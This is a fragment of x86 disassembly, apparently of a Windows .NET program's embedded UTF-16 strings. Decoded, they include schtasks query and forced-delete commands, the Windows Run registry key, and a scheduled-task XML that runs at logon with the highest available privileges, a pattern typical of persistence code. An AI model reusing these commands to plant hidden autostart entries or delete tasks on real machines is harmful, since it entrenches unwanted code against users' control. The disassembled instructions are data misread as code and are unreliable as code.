  40b33a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b33e:	61                   	popa
  40b33f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b343:	00 6e 00             	add    %ch,0x0(%esi)
  40b346:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40b34a:	79 00                	jns    0x40b34c
  40b34c:	73 00                	jae    0x40b34e
  40b34e:	74 00                	je     0x40b350
  40b350:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b354:	00 0f                	add    %cl,(%edi)
  40b356:	43                   	inc    %ebx
  40b357:	00 61 00             	add    %ah,0x0(%ecx)
  40b35a:	70 00                	jo     0x40b35c
  40b35c:	74 00                	je     0x40b35e
  40b35e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b364:	00 1d 4f 00 53 00    	add    %bl,0x53004f
  40b36a:	41                   	inc    %ecx
  40b36b:	00 72 00             	add    %dh,0x0(%edx)
  40b36e:	63 00                	arpl   %eax,(%eax)
  40b370:	68 00 69 00 74       	push   $0x74006900
  40b375:	00 65 00             	add    %ah,0x0(%ebp)
  40b378:	63 00                	arpl   %eax,(%eax)
  40b37a:	74 00                	je     0x40b37c
  40b37c:	75 00                	jne    0x40b37e
  40b37e:	72 00                	jb     0x40b380
  40b380:	65 00 00             	add    %al,%gs:(%eax)
  40b383:	0f 55 00             	andnps (%eax),%xmm0
  40b386:	4e                   	dec    %esi
  40b387:	00 4b 00             	add    %cl,0x0(%ebx)
  40b38a:	4e                   	dec    %esi
  40b38b:	00 4f 00             	add    %cl,0x0(%edi)
  40b38e:	57                   	push   %edi
  40b38f:	00 4e 00             	add    %cl,0x0(%esi)
  40b392:	00 05 78 00 32 00    	add    %al,0x320078
  40b398:	00 19                	add    %bl,(%ecx)
  40b39a:	73 00                	jae    0x40b39c
  40b39c:	63 00                	arpl   %eax,(%eax)
  40b39e:	68 00 74 00 61       	push   $0x61007400
  40b3a3:	00 73 00             	add    %dh,0x0(%ebx)
  40b3a6:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b3a9:	00 2e                	add    %ch,(%esi)
  40b3ab:	00 65 00             	add    %ah,0x0(%ebp)
  40b3ae:	78 00                	js     0x40b3b0
  40b3b0:	65 00 00             	add    %al,%gs:(%eax)
  40b3b3:	23 2f                	and    (%edi),%ebp
  40b3b5:	00 71 00             	add    %dh,0x0(%ecx)
  40b3b8:	75 00                	jne    0x40b3ba
  40b3ba:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b3be:	79 00                	jns    0x40b3c0
  40b3c0:	20 00                	and    %al,(%eax)
  40b3c2:	2f                   	das
  40b3c3:	00 76 00             	add    %dh,0x0(%esi)
  40b3c6:	20 00                	and    %al,(%eax)
  40b3c8:	2f                   	das
  40b3c9:	00 66 00             	add    %ah,0x0(%esi)
  40b3cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3cd:	00 20                	add    %ah,(%eax)
  40b3cf:	00 63 00             	add    %ah,0x0(%ebx)
  40b3d2:	73 00                	jae    0x40b3d4
  40b3d4:	76 00                	jbe    0x40b3d6
  40b3d6:	00 03                	add    %al,(%ebx)
  40b3d8:	22 00                	and    (%eax),%al
  40b3da:	00 11                	add    %dl,(%ecx)
  40b3dc:	54                   	push   %esp
  40b3dd:	00 61 00             	add    %ah,0x0(%ecx)
  40b3e0:	73 00                	jae    0x40b3e2
  40b3e2:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40b3e5:	00 61 00             	add    %ah,0x0(%ecx)
  40b3e8:	6d                   	insl   (%dx),%es:(%edi)
  40b3e9:	00 65 00             	add    %ah,0x0(%ebp)
  40b3ec:	00 17                	add    %dl,(%edi)
  40b3ee:	54                   	push   %esp
  40b3ef:	00 61 00             	add    %ah,0x0(%ecx)
  40b3f2:	73 00                	jae    0x40b3f4
  40b3f4:	6b 00 20             	imul   $0x20,(%eax),%eax
  40b3f7:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40b3fb:	00 20                	add    %ah,(%eax)
  40b3fd:	00 52 00             	add    %dl,0x0(%edx)
  40b400:	75 00                	jne    0x40b402
  40b402:	6e                   	outsb  %ds:(%esi),(%dx)
  40b403:	00 00                	add    %al,(%eax)
  40b405:	07                   	pop    %es
  40b406:	22 00                	and    (%eax),%al
  40b408:	2c 00                	sub    $0x0,%al
  40b40a:	22 00                	and    (%eax),%al
  40b40c:	00 1b                	add    %bl,(%ebx)
  40b40e:	2f                   	das
  40b40f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b413:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b417:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b41b:	00 20                	add    %ah,(%eax)
  40b41d:	00 2f                	add    %ch,(%edi)
  40b41f:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b423:	00 20                	add    %ah,(%eax)
  40b425:	00 22                	add    %ah,(%edx)
  40b427:	00 00                	add    %al,(%eax)
  40b429:	09 22                	or     %esp,(%edx)
  40b42b:	00 20                	add    %ah,(%eax)
  40b42d:	00 2f                	add    %ch,(%edi)
  40b42f:	00 66 00             	add    %ah,0x0(%esi)
  40b432:	00 5b 53             	add    %bl,0x53(%ebx)
  40b435:	00 4f 00             	add    %cl,0x0(%edi)
  40b438:	46                   	inc    %esi
  40b439:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40b43d:	00 41 00             	add    %al,0x0(%ecx)
  40b440:	52                   	push   %edx
  40b441:	00 45 00             	add    %al,0x0(%ebp)
  40b444:	5c                   	pop    %esp
  40b445:	00 4d 00             	add    %cl,0x0(%ebp)
  40b448:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40b44e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b44f:	00 73 00             	add    %dh,0x0(%ebx)
  40b452:	6f                   	outsl  %ds:(%esi),(%dx)
  40b453:	00 66 00             	add    %ah,0x0(%esi)
  40b456:	74 00                	je     0x40b458
  40b458:	5c                   	pop    %esp
  40b459:	00 57 00             	add    %dl,0x0(%edi)
  40b45c:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b462:	6f                   	outsl  %ds:(%esi),(%dx)
  40b463:	00 77 00             	add    %dh,0x0(%edi)
  40b466:	73 00                	jae    0x40b468
  40b468:	5c                   	pop    %esp
  40b469:	00 43 00             	add    %al,0x0(%ebx)
  40b46c:	75 00                	jne    0x40b46e
  40b46e:	72 00                	jb     0x40b470
  40b470:	72 00                	jb     0x40b472
  40b472:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b476:	74 00                	je     0x40b478
  40b478:	56                   	push   %esi
  40b479:	00 65 00             	add    %ah,0x0(%ebp)
  40b47c:	72 00                	jb     0x40b47e
  40b47e:	73 00                	jae    0x40b480
  40b480:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b486:	5c                   	pop    %esp
  40b487:	00 52 00             	add    %dl,0x0(%edx)
  40b48a:	75 00                	jne    0x40b48c
  40b48c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b48d:	00 00                	add    %al,(%eax)
  40b48f:	87 05 0a 00 20 00    	xchg   %eax,0x20000a
  40b495:	20 00                	and    %al,(%eax)
  40b497:	20 00                	and    %al,(%eax)
  40b499:	20 00                	and    %al,(%eax)
  40b49b:	20 00                	and    %al,(%eax)
  40b49d:	20 00                	and    %al,(%eax)
  40b49f:	20 00                	and    %al,(%eax)
  40b4a1:	20 00                	and    %al,(%eax)
  40b4a3:	20 00                	and    %al,(%eax)
  40b4a5:	20 00                	and    %al,(%eax)
  40b4a7:	20 00                	and    %al,(%eax)
  40b4a9:	20 00                	and    %al,(%eax)
  40b4ab:	20 00                	and    %al,(%eax)
  40b4ad:	20 00                	and    %al,(%eax)
  40b4af:	20 00                	and    %al,(%eax)
  40b4b1:	20 00                	and    %al,(%eax)
  40b4b3:	3c 00                	cmp    $0x0,%al
  40b4b5:	54                   	push   %esp
  40b4b6:	00 61 00             	add    %ah,0x0(%ecx)
  40b4b9:	73 00                	jae    0x40b4bb
  40b4bb:	6b 00 20             	imul   $0x20,(%eax),%eax
  40b4be:	00 78 00             	add    %bh,0x0(%eax)
  40b4c1:	6d                   	insl   (%dx),%es:(%edi)
  40b4c2:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40b4c6:	00 73 00             	add    %dh,0x0(%ebx)
  40b4c9:	3d 00 27 00 68       	cmp    $0x68002700,%eax
  40b4ce:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b4d2:	00 70 00             	add    %dh,0x0(%eax)
  40b4d5:	3a 00                	cmp    (%eax),%al
  40b4d7:	2f                   	das
  40b4d8:	00 2f                	add    %ch,(%edi)
  40b4da:	00 73 00             	add    %dh,0x0(%ebx)
  40b4dd:	63 00                	arpl   %eax,(%eax)
  40b4df:	68 00 65 00 6d       	push   $0x6d006500
  40b4e4:	00 61 00             	add    %ah,0x0(%ecx)
  40b4e7:	73 00                	jae    0x40b4e9
  40b4e9:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40b4ed:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40b4f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4f4:	00 73 00             	add    %dh,0x0(%ebx)
  40b4f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4f8:	00 66 00             	add    %ah,0x0(%esi)
  40b4fb:	74 00                	je     0x40b4fd
  40b4fd:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40b501:	6f                   	outsl  %ds:(%esi),(%dx)
  40b502:	00 6d 00             	add    %ch,0x0(%ebp)
  40b505:	2f                   	das
  40b506:	00 77 00             	add    %dh,0x0(%edi)
  40b509:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b50f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b510:	00 77 00             	add    %dh,0x0(%edi)
  40b513:	73 00                	jae    0x40b515
  40b515:	2f                   	das
  40b516:	00 32                	add    %dh,(%edx)
  40b518:	00 30                	add    %dh,(%eax)
  40b51a:	00 30                	add    %dh,(%eax)
  40b51c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b51f:	2f                   	das
  40b520:	00 30                	add    %dh,(%eax)
  40b522:	00 32                	add    %dh,(%edx)
  40b524:	00 2f                	add    %ch,(%edi)
  40b526:	00 6d 00             	add    %ch,0x0(%ebp)
  40b529:	69 00 74 00 2f 00    	imul   $0x2f0074,(%eax),%eax
  40b52f:	74 00                	je     0x40b531
  40b531:	61                   	popa
  40b532:	00 73 00             	add    %dh,0x0(%ebx)
  40b535:	6b 00 27             	imul   $0x27,(%eax),%eax
  40b538:	00 3e                	add    %bh,(%esi)
  40b53a:	00 0a                	add    %cl,(%edx)
  40b53c:	00 20                	add    %ah,(%eax)
  40b53e:	00 20                	add    %ah,(%eax)
  40b540:	00 20                	add    %ah,(%eax)
  40b542:	00 20                	add    %ah,(%eax)
  40b544:	00 20                	add    %ah,(%eax)
  40b546:	00 20                	add    %ah,(%eax)
  40b548:	00 20                	add    %ah,(%eax)
  40b54a:	00 20                	add    %ah,(%eax)
  40b54c:	00 20                	add    %ah,(%eax)
  40b54e:	00 20                	add    %ah,(%eax)
  40b550:	00 20                	add    %ah,(%eax)
  40b552:	00 20                	add    %ah,(%eax)
  40b554:	00 20                	add    %ah,(%eax)
  40b556:	00 20                	add    %ah,(%eax)
  40b558:	00 20                	add    %ah,(%eax)
  40b55a:	00 20                	add    %ah,(%eax)
  40b55c:	00 20                	add    %ah,(%eax)
  40b55e:	00 20                	add    %ah,(%eax)
  40b560:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b563:	54                   	push   %esp
  40b564:	00 72 00             	add    %dh,0x0(%edx)
  40b567:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  40b56d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b571:	73 00                	jae    0x40b573
  40b573:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b576:	00 20                	add    %ah,(%eax)
  40b578:	00 20                	add    %ah,(%eax)
  40b57a:	00 20                	add    %ah,(%eax)
  40b57c:	00 20                	add    %ah,(%eax)
  40b57e:	00 20                	add    %ah,(%eax)
  40b580:	00 20                	add    %ah,(%eax)
  40b582:	00 20                	add    %ah,(%eax)
  40b584:	00 20                	add    %ah,(%eax)
  40b586:	00 20                	add    %ah,(%eax)
  40b588:	00 20                	add    %ah,(%eax)
  40b58a:	00 20                	add    %ah,(%eax)
  40b58c:	00 20                	add    %ah,(%eax)
  40b58e:	00 20                	add    %ah,(%eax)
  40b590:	00 20                	add    %ah,(%eax)
  40b592:	00 20                	add    %ah,(%eax)
  40b594:	00 20                	add    %ah,(%eax)
  40b596:	00 20                	add    %ah,(%eax)
  40b598:	00 20                	add    %ah,(%eax)
  40b59a:	00 20                	add    %ah,(%eax)
  40b59c:	00 20                	add    %ah,(%eax)
  40b59e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b5a1:	4c                   	dec    %esp
  40b5a2:	00 6f 00             	add    %ch,0x0(%edi)
  40b5a5:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b5a9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5aa:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40b5ae:	00 69 00             	add    %ch,0x0(%ecx)
  40b5b1:	67 00 67 00          	add    %ah,0x0(%bx)
  40b5b5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b5b9:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b5bc:	00 20                	add    %ah,(%eax)
  40b5be:	00 20                	add    %ah,(%eax)
  40b5c0:	00 20                	add    %ah,(%eax)
  40b5c2:	00 20                	add    %ah,(%eax)
  40b5c4:	00 20                	add    %ah,(%eax)
  40b5c6:	00 20                	add    %ah,(%eax)
  40b5c8:	00 20                	add    %ah,(%eax)
  40b5ca:	00 20                	add    %ah,(%eax)
  40b5cc:	00 20                	add    %ah,(%eax)
  40b5ce:	00 20                	add    %ah,(%eax)
  40b5d0:	00 20                	add    %ah,(%eax)
  40b5d2:	00 20                	add    %ah,(%eax)
  40b5d4:	00 20                	add    %ah,(%eax)
  40b5d6:	00 20                	add    %ah,(%eax)
  40b5d8:	00 20                	add    %ah,(%eax)
  40b5da:	00 20                	add    %ah,(%eax)
  40b5dc:	00 20                	add    %ah,(%eax)
  40b5de:	00 20                	add    %ah,(%eax)
  40b5e0:	00 20                	add    %ah,(%eax)
  40b5e2:	00 20                	add    %ah,(%eax)
  40b5e4:	00 20                	add    %ah,(%eax)
  40b5e6:	00 20                	add    %ah,(%eax)
  40b5e8:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b5eb:	45                   	inc    %ebp
  40b5ec:	00 6e 00             	add    %ch,0x0(%esi)
  40b5ef:	61                   	popa
  40b5f0:	00 62 00             	add    %ah,0x0(%edx)
  40b5f3:	6c                   	insb   (%dx),%es:(%edi)
  40b5f4:	00 65 00             	add    %ah,0x0(%ebp)
  40b5f7:	64 00 3e             	add    %bh,%fs:(%esi)
  40b5fa:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b5fe:	00 75 00             	add    %dh,0x0(%ebp)
  40b601:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  40b605:	2f                   	das
  40b606:	00 45 00             	add    %al,0x0(%ebp)
  40b609:	6e                   	outsb  %ds:(%esi),(%dx)
  40b60a:	00 61 00             	add    %ah,0x0(%ecx)
  40b60d:	62 00                	bound  %eax,(%eax)
  40b60f:	6c                   	insb   (%dx),%es:(%edi)
  40b610:	00 65 00             	add    %ah,0x0(%ebp)
  40b613:	64 00 3e             	add    %bh,%fs:(%esi)
  40b616:	00 0a                	add    %cl,(%edx)
  40b618:	00 20                	add    %ah,(%eax)
  40b61a:	00 20                	add    %ah,(%eax)
  40b61c:	00 20                	add    %ah,(%eax)
  40b61e:	00 20                	add    %ah,(%eax)
  40b620:	00 20                	add    %ah,(%eax)
  40b622:	00 20                	add    %ah,(%eax)
  40b624:	00 20                	add    %ah,(%eax)
  40b626:	00 20                	add    %ah,(%eax)
  40b628:	00 20                	add    %ah,(%eax)
  40b62a:	00 20                	add    %ah,(%eax)
  40b62c:	00 20                	add    %ah,(%eax)
  40b62e:	00 20                	add    %ah,(%eax)
  40b630:	00 20                	add    %ah,(%eax)
  40b632:	00 20                	add    %ah,(%eax)
  40b634:	00 20                	add    %ah,(%eax)
  40b636:	00 20                	add    %ah,(%eax)
  40b638:	00 20                	add    %ah,(%eax)
  40b63a:	00 20                	add    %ah,(%eax)
  40b63c:	00 20                	add    %ah,(%eax)
  40b63e:	00 20                	add    %ah,(%eax)
  40b640:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b643:	2f                   	das
  40b644:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b648:	00 67 00             	add    %ah,0x0(%edi)
  40b64b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b64c:	00 6e 00             	add    %ch,0x0(%esi)
  40b64f:	54                   	push   %esp
  40b650:	00 72 00             	add    %dh,0x0(%edx)
  40b653:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  40b659:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b65d:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b660:	00 20                	add    %ah,(%eax)
  40b662:	00 20                	add    %ah,(%eax)
  40b664:	00 20                	add    %ah,(%eax)
  40b666:	00 20                	add    %ah,(%eax)
  40b668:	00 20                	add    %ah,(%eax)
  40b66a:	00 20                	add    %ah,(%eax)
  40b66c:	00 20                	add    %ah,(%eax)
  40b66e:	00 20                	add    %ah,(%eax)
  40b670:	00 20                	add    %ah,(%eax)
  40b672:	00 20                	add    %ah,(%eax)
  40b674:	00 20                	add    %ah,(%eax)
  40b676:	00 20                	add    %ah,(%eax)
  40b678:	00 20                	add    %ah,(%eax)
  40b67a:	00 20                	add    %ah,(%eax)
  40b67c:	00 20                	add    %ah,(%eax)
  40b67e:	00 20                	add    %ah,(%eax)
  40b680:	00 20                	add    %ah,(%eax)
  40b682:	00 20                	add    %ah,(%eax)
  40b684:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b687:	2f                   	das
  40b688:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40b68c:	00 69 00             	add    %ch,0x0(%ecx)
  40b68f:	67 00 67 00          	add    %ah,0x0(%bx)
  40b693:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b697:	73 00                	jae    0x40b699
  40b699:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b69c:	00 20                	add    %ah,(%eax)
  40b69e:	00 20                	add    %ah,(%eax)
  40b6a0:	00 20                	add    %ah,(%eax)
  40b6a2:	00 20                	add    %ah,(%eax)
  40b6a4:	00 20                	add    %ah,(%eax)
  40b6a6:	00 20                	add    %ah,(%eax)
  40b6a8:	00 20                	add    %ah,(%eax)
  40b6aa:	00 20                	add    %ah,(%eax)
  40b6ac:	00 20                	add    %ah,(%eax)
  40b6ae:	00 20                	add    %ah,(%eax)
  40b6b0:	00 20                	add    %ah,(%eax)
  40b6b2:	00 20                	add    %ah,(%eax)
  40b6b4:	00 20                	add    %ah,(%eax)
  40b6b6:	00 20                	add    %ah,(%eax)
  40b6b8:	00 20                	add    %ah,(%eax)
  40b6ba:	00 20                	add    %ah,(%eax)
  40b6bc:	00 20                	add    %ah,(%eax)
  40b6be:	00 20                	add    %ah,(%eax)
  40b6c0:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b6c3:	50                   	push   %eax
  40b6c4:	00 72 00             	add    %dh,0x0(%edx)
  40b6c7:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40b6cd:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40b6d3:	6c                   	insb   (%dx),%es:(%edi)
  40b6d4:	00 73 00             	add    %dh,0x0(%ebx)
  40b6d7:	3e 00 0a             	add    %cl,%ds:(%edx)
  40b6da:	00 20                	add    %ah,(%eax)
  40b6dc:	00 20                	add    %ah,(%eax)
  40b6de:	00 20                	add    %ah,(%eax)
  40b6e0:	00 20                	add    %ah,(%eax)
  40b6e2:	00 20                	add    %ah,(%eax)
  40b6e4:	00 20                	add    %ah,(%eax)
  40b6e6:	00 20                	add    %ah,(%eax)
  40b6e8:	00 20                	add    %ah,(%eax)
  40b6ea:	00 20                	add    %ah,(%eax)
  40b6ec:	00 20                	add    %ah,(%eax)
  40b6ee:	00 20                	add    %ah,(%eax)
  40b6f0:	00 20                	add    %ah,(%eax)
  40b6f2:	00 20                	add    %ah,(%eax)
  40b6f4:	00 20                	add    %ah,(%eax)
  40b6f6:	00 20                	add    %ah,(%eax)
  40b6f8:	00 20                	add    %ah,(%eax)
  40b6fa:	00 20                	add    %ah,(%eax)
  40b6fc:	00 20                	add    %ah,(%eax)
  40b6fe:	00 20                	add    %ah,(%eax)
  40b700:	00 20                	add    %ah,(%eax)
  40b702:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b705:	50                   	push   %eax
  40b706:	00 72 00             	add    %dh,0x0(%edx)
  40b709:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40b70f:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40b715:	6c                   	insb   (%dx),%es:(%edi)
  40b716:	00 20                	add    %ah,(%eax)
  40b718:	00 69 00             	add    %ch,0x0(%ecx)
  40b71b:	64 00 3d 00 27 00 41 	add    %bh,%fs:0x41002700
  40b722:	00 75 00             	add    %dh,0x0(%ebp)
  40b725:	74 00                	je     0x40b727
  40b727:	68 00 6f 00 72       	push   $0x72006f00
  40b72c:	00 27                	add    %ah,(%edi)
  40b72e:	00 3e                	add    %bh,(%esi)
  40b730:	00 0a                	add    %cl,(%edx)
  40b732:	00 20                	add    %ah,(%eax)
  40b734:	00 20                	add    %ah,(%eax)
  40b736:	00 20                	add    %ah,(%eax)
  40b738:	00 20                	add    %ah,(%eax)
  40b73a:	00 20                	add    %ah,(%eax)
  40b73c:	00 20                	add    %ah,(%eax)
  40b73e:	00 20                	add    %ah,(%eax)
  40b740:	00 20                	add    %ah,(%eax)
  40b742:	00 20                	add    %ah,(%eax)
  40b744:	00 20                	add    %ah,(%eax)
  40b746:	00 20                	add    %ah,(%eax)
  40b748:	00 20                	add    %ah,(%eax)
  40b74a:	00 20                	add    %ah,(%eax)
  40b74c:	00 20                	add    %ah,(%eax)
  40b74e:	00 20                	add    %ah,(%eax)
  40b750:	00 20                	add    %ah,(%eax)
  40b752:	00 20                	add    %ah,(%eax)
  40b754:	00 20                	add    %ah,(%eax)
  40b756:	00 20                	add    %ah,(%eax)
  40b758:	00 20                	add    %ah,(%eax)
  40b75a:	00 20                	add    %ah,(%eax)
  40b75c:	00 20                	add    %ah,(%eax)
  40b75e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b761:	4c                   	dec    %esp
  40b762:	00 6f 00             	add    %ch,0x0(%edi)
  40b765:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b769:	6e                   	outsb  %ds:(%esi),(%dx)
  40b76a:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40b76e:	00 70 00             	add    %dh,0x0(%eax)
  40b771:	65 00 3e             	add    %bh,%gs:(%esi)
  40b774:	00 49 00             	add    %cl,0x0(%ecx)
  40b777:	6e                   	outsb  %ds:(%esi),(%dx)
  40b778:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b77c:	00 72 00             	add    %dh,0x0(%edx)
  40b77f:	61                   	popa
  40b780:	00 63 00             	add    %ah,0x0(%ebx)
  40b783:	74 00                	je     0x40b785
  40b785:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40b78b:	54                   	push   %esp
  40b78c:	00 6f 00             	add    %ch,0x0(%edi)
  40b78f:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b792:	00 6e 00             	add    %ch,0x0(%esi)
  40b795:	3c 00                	cmp    $0x0,%al
  40b797:	2f                   	das
  40b798:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40b79c:	00 67 00             	add    %ah,0x0(%edi)
  40b79f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7a0:	00 6e 00             	add    %ch,0x0(%esi)
  40b7a3:	54                   	push   %esp
  40b7a4:	00 79 00             	add    %bh,0x0(%ecx)
  40b7a7:	70 00                	jo     0x40b7a9
  40b7a9:	65 00 3e             	add    %bh,%gs:(%esi)
  40b7ac:	00 0a                	add    %cl,(%edx)
  40b7ae:	00 20                	add    %ah,(%eax)
  40b7b0:	00 20                	add    %ah,(%eax)
  40b7b2:	00 20                	add    %ah,(%eax)
  40b7b4:	00 20                	add    %ah,(%eax)
  40b7b6:	00 20                	add    %ah,(%eax)
  40b7b8:	00 20                	add    %ah,(%eax)
  40b7ba:	00 20                	add    %ah,(%eax)
  40b7bc:	00 20                	add    %ah,(%eax)
  40b7be:	00 20                	add    %ah,(%eax)
  40b7c0:	00 20                	add    %ah,(%eax)
  40b7c2:	00 20                	add    %ah,(%eax)
  40b7c4:	00 20                	add    %ah,(%eax)
  40b7c6:	00 20                	add    %ah,(%eax)
  40b7c8:	00 20                	add    %ah,(%eax)
  40b7ca:	00 20                	add    %ah,(%eax)
  40b7cc:	00 20                	add    %ah,(%eax)
  40b7ce:	00 20                	add    %ah,(%eax)
  40b7d0:	00 20                	add    %ah,(%eax)
  40b7d2:	00 20                	add    %ah,(%eax)
  40b7d4:	00 20                	add    %ah,(%eax)
  40b7d6:	00 20                	add    %ah,(%eax)
  40b7d8:	00 20                	add    %ah,(%eax)
  40b7da:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b7dd:	52                   	push   %edx
  40b7de:	00 75 00             	add    %dh,0x0(%ebp)
  40b7e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7e2:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40b7e6:	00 76 00             	add    %dh,0x0(%esi)
  40b7e9:	65 00 6c 00 3e       	add    %ch,%gs:0x3e(%eax,%eax,1)
  40b7ee:	00 48 00             	add    %cl,0x0(%eax)
  40b7f1:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7f7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7fb:	74 00                	je     0x40b7fd
  40b7fd:	41                   	inc    %ecx
  40b7fe:	00 76 00             	add    %dh,0x0(%esi)
  40b801:	61                   	popa
  40b802:	00 69 00             	add    %ch,0x0(%ecx)
  40b805:	6c                   	insb   (%dx),%es:(%edi)
  40b806:	00 61 00             	add    %ah,0x0(%ecx)
  40b809:	62 00                	bound  %eax,(%eax)
  40b80b:	6c                   	insb   (%dx),%es:(%edi)
  40b80c:	00 65 00             	add    %ah,0x0(%ebp)
  40b80f:	3c 00                	cmp    $0x0,%al
  40b811:	2f                   	das
  40b812:	00 52 00             	add    %dl,0x0(%edx)
  40b815:	75 00                	jne    0x40b817
  40b817:	6e                   	outsb  %ds:(%esi),(%dx)
  40b818:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40b81c:	00 76 00             	add    %dh,0x0(%esi)
  40b81f:	65 00 6c 00 3e       	add    %ch,%gs:0x3e(%eax,%eax,1)
  40b824:	00 0a                	add    %cl,(%edx)
  40b826:	00 20                	add    %ah,(%eax)
  40b828:	00 20                	add    %ah,(%eax)
  40b82a:	00 20                	add    %ah,(%eax)
  40b82c:	00 20                	add    %ah,(%eax)
  40b82e:	00 20                	add    %ah,(%eax)
  40b830:	00 20                	add    %ah,(%eax)
  40b832:	00 20                	add    %ah,(%eax)
  40b834:	00 20                	add    %ah,(%eax)
  40b836:	00 20                	add    %ah,(%eax)
  40b838:	00 20                	add    %ah,(%eax)
  40b83a:	00 20                	add    %ah,(%eax)
  40b83c:	00 20                	add    %ah,(%eax)
  40b83e:	00 20                	add    %ah,(%eax)
  40b840:	00 20                	add    %ah,(%eax)
  40b842:	00 20                	add    %ah,(%eax)
  40b844:	00 20                	add    %ah,(%eax)
  40b846:	00 20                	add    %ah,(%eax)
  40b848:	00 20                	add    %ah,(%eax)
  40b84a:	00 20                	add    %ah,(%eax)
  40b84c:	00 20                	add    %ah,(%eax)
  40b84e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b851:	2f                   	das
  40b852:	00 50 00             	add    %dl,0x0(%eax)
  40b855:	72 00                	jb     0x40b857
  40b857:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40b85d:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40b863:	6c                   	insb   (%dx),%es:(%edi)
  40b864:	00 3e                	add    %bh,(%esi)
  40b866:	00 0a                	add    %cl,(%edx)
  40b868:	00 20                	add    %ah,(%eax)
  40b86a:	00 20                	add    %ah,(%eax)
  40b86c:	00 20                	add    %ah,(%eax)
  40b86e:	00 20                	add    %ah,(%eax)
  40b870:	00 20                	add    %ah,(%eax)
  40b872:	00 20                	add    %ah,(%eax)
  40b874:	00 20                	add    %ah,(%eax)
  40b876:	00 20                	add    %ah,(%eax)
  40b878:	00 20                	add    %ah,(%eax)
  40b87a:	00 20                	add    %ah,(%eax)
  40b87c:	00 20                	add    %ah,(%eax)
  40b87e:	00 20                	add    %ah,(%eax)
  40b880:	00 20                	add    %ah,(%eax)
  40b882:	00 20                	add    %ah,(%eax)
  40b884:	00 20                	add    %ah,(%eax)
  40b886:	00 20                	add    %ah,(%eax)
  40b888:	00 20                	add    %ah,(%eax)
  40b88a:	00 20                	add    %ah,(%eax)
  40b88c:	00 3c 00             	add    %bh,(%eax,%eax,1)
